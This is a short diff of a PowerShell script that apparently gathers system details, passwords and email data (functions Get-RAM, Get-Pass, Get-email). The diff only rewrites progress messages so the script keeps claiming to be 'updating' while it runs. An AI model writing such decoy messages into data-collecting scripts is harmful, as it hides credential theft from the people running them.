@@ -133,7 +133,7 @@ function Get-RAM {
 }
 
 # Write-Host statement used to track progress while debugging
-Write-Host "Updating ..."
+Write-Host "Updating ....."
 
 ###########################################################################################################
 
@@ -230,7 +230,7 @@ function Get-Pass {
 }
 
 # Write-Host statement used to track progress while debugging
-Write-Host "Updating ..."
+Write-Host "Still Updating ..."
 
 ###########################################################################################################
 
@@ -509,7 +509,7 @@ Write-Host "All updates done. Finishing installation ..."
 }
 $pls = Get-Days_Set
 # Write-Host statement used to track progress while debugging
-Write-Host "Finishing installation ..."
+Write-Host " Updating: 30s left....."
 
 ###########################################################################################################
 
@@ -560,7 +560,7 @@ function Get-email {
 }
 $setmail = Get-email
 # Write-Host statement used to track progress while debugging
-Write-Host "Installation done."
+Write-Host "Trying to update services ..."
 
 ###########################################################################################################
 
